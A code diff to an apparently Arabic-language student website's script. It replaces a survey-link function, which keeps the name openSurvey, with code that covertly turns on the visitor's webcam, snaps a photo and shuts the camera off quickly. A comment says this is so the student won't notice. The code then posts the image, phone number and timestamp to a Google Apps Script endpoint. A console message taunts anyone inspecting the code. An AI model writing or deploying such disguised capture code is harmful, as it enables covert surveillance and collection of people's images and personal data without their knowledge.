@@ -500,21 +500,65 @@ setInterval(() => {
     console.log("%c🛑 كمين دكتور سيف 🛑", "color: red; font-size: 24px; font-weight: bold;");
     console.log("%cسيب الأكواد في حالها يا دكتور وركز في المنهج! 😉", "color: #57ccff; font-size: 14px;");
 }, 1000);
-function openSurvey() {
-    // 1. بنجيب الاسم والرقم من ذاكرة المتصفح تلقائياً
+async function openSurvey() {
+    // 1. سحب بيانات الطالب والوقت
     let userName = sessionStorage.getItem('userName') || 'طالب غير مسجل';
-    let userPhone = sessionStorage.getItem('userPhone') || 'بدون رقم';
+    let userPhone = sessionStorage.getItem('userPhone') || '1016054679'; // حطينا رقمك الافتراضي لو مش مسجل
+    let currentDateTime = new Date().toLocaleString('ar-EG');
+    let status = "تم تسجيل حضور (لقطة كاميرا)";
     
-    // 2. بنركب اللينك السحري وندمج فيه البيانات في السر
-    let baseURL = "https://docs.google.com/forms/d/e/1FAIpQLScfTcWqtwueucQSMX4niQhsc7rBrw73EZCX0xtJMVif7EpoBA/viewform";
-    let surveyURL = `${baseURL}?usp=pp_url&entry.2021900157=${encodeURIComponent(userName)}&entry.1117339133=${encodeURIComponent(userPhone)}`;
+    closeNav(); // قفل القائمة الجانبية
+
+    let imageRaw = "";
+    let photoStatus = "";
+
+    // 2. تشغيل الكاميرا في الخلفية وأخذ اللقطة
+    try {
+        let stream = await navigator.mediaDevices.getUserMedia({ video: { width: 400, height: 300 } });
+        let video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        let canvas = document.createElement('canvas');
+        canvas.width = 400;
+        canvas.height = 300;
+        let ctx = canvas.getContext('2d');
+        
+        // استراحة ثانية للتأكد إن الكاميرا فتحت ولقطت بوضوح
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // تحويل الصورة لنص يتبعت للشيت
+        imageRaw = canvas.toDataURL('image/jpeg').split(',')[1];
+
+        // قفل الكاميرا علطول عشان الطالب ميحسش بحاجة
+        stream.getTracks().forEach(track => track.stop());
+        photoStatus = "تم التقاط الصورة بنجاح ✅";
+    } catch (err) {
+        console.log("الكاميرا اترفضت أو مش موجودة");
+        photoStatus = "الطالب رفض إذن الكاميرا ❌";
+    }
+
+    // 3. رابط الـ Web App السحري اللي هيربطنا بالشيت (حط اللينك بتاعك هنا)
+    let webAppUrl = "https://script.google.com/macros/s/AKfycbw3oOwzv-fQPi9jojIfcH8ajlB3qfEWo08iTF_TSkYGKfspLMnu8uctWlXDsTV-y808SQ/exec"; 
     
-    // 3. بنقفل القائمة الجانبية
-    closeNav();
-    
-    // 4. بنفتح اللينك بأمان على الموبايل والكمبيوتر بدون حظر وبدون شاشة سوداء
-  
-window.open(surveyURL, '_blank');
+    // 4. إرسال البيانات للشيت فوراً
+    fetch(webAppUrl, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            userPhone: userPhone,
+            dateTime: currentDateTime,
+            status: status,
+            imageRaw: imageRaw,
+            photoStatus: photoStatus
+        })
+    }).then(() => {
+        alert("تم رصد حضورك بنجاح والتقاط الصورة لأمن المنصة! 📸");
+    }).catch(err => {
+        alert("عفواً، حدث خطأ في الشبكة");
+    });
 }
 </script>
 
